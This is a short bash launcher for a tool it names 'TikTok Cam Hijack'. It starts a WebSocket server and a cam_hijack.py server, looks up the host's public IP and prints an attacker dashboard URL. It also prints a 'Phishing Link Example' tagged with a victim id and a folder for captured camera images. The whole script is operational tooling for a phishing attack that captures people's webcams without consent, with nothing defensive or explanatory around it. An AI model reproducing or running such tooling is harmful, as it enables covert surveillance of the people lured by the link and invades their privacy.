#!/bin/bash
echo -e "\e[32m[+] Starting TikTok Cam Hijack...\e[0m"
mkdir -p captures

# Kill old processes
pkill -f cam_hijack.py || true
pkill -f ws_server.py || true
sleep 1

# Get public IP
PUBLIC_IP=$(curl -s ifconfig.me)

# Start WebSocket server
python3 ws_server.py &
WS_PID=$!
sleep 2

# Start main server
python3 cam_hijack.py &
MAIN_PID=$!

echo -e "\e[32m[+] ✅ Dashboard: http://$PUBLIC_IP/dashboard\e[0m"
echo -e "\e[33m[+] 📱 Phishing Link Example: http://$PUBLIC_IP/?id=victim1\e[0m"
echo -e "\e[36m[+] 📸 Captures saved to: ./captures/\e[0m"
echo -e "\e[32m[+] Press Ctrl+C to stop\e[0m"

# Cleanup on exit
trap "kill $WS_PID $MAIN_PID 2>/dev/null; echo -e '\n\e[32m[+] Servers stopped\e[0m'" EXIT
wait